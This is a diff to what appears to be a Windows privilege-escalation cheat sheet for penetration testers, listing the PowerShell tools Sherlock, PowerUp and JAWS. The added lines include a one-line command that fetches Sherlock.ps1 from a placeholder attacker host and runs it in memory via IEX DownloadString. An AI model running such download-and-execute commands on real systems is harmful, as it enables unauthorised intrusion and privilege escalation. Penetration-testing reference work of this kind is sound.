@@ -88,7 +88,10 @@
 
 #### PowerShell
 
-- [Sherlock](https://github.com/rasta-mouse/Sherlock)
+- [Sherlock](https://github.com/rasta-mouse/Sherlock) is a script that will give exploit related to the target.  
+  It can also be found here on kali if empire is installed `/usr/share/powershell-empire/empire/server/data/module_source/privesc/Sherlock.ps1`
+  - We can launch it with cmd like this (has to be served through an http server from the attacking machine)  
+  `echo IEX(New-Object Net.WebClient).DownloadString('http://ATTACK-MACHINE-IP/Sherlock.ps1') | powershell -noprofile -`
 - [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) is a powershell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found.
 - [JAWS](https://github.com/411Hall/JAWS) is PowerShell script designed to help penetration testers (and CTFers) quickly identify potential privilege escalation vectors on Windows systems. It is written using PowerShell 2.0 so 'should' run on every Windows version since Windows 7.
 
